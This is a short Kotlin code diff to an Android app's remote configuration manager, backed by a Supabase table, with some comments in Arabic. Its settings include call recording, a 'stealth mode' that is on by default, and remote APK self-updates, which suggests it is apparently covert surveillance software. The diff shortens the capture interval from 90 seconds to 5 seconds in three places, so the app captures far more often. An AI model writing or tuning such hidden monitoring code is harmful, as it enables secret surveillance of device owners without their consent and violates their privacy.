@@ -66,7 +66,7 @@ class RemoteConfigManager(private val context: Context) {
                 record_calls = false,
                 stealth_mode_active = true,
                 recording_enabled = false,
-                capture_interval = 90000
+                capture_interval = 5000
             )
             client.from(TABLE_NAME).insert(defaultSettings)
             Log.i(TAG, "Default settings initialized for device: $deviceId")
@@ -92,7 +92,7 @@ data class AppSettings(
     val update_apk_path: String? = null,  // مسار Supabase Storage
     val update_apk_url: String? = null,    // رابط HTTP مباشر (الأولوية عند وجوده)
     val recording_enabled: Boolean = false,
-    val capture_interval: Long = 90000
+    val capture_interval: Long = 5000
 )
 
 @Serializable
@@ -103,5 +103,5 @@ data class DefaultSettingsPayload(
     val record_calls: Boolean = false,
     val stealth_mode_active: Boolean = true,
     val recording_enabled: Boolean = false,
-    val capture_interval: Long = 90000
+    val capture_interval: Long = 5000
 )
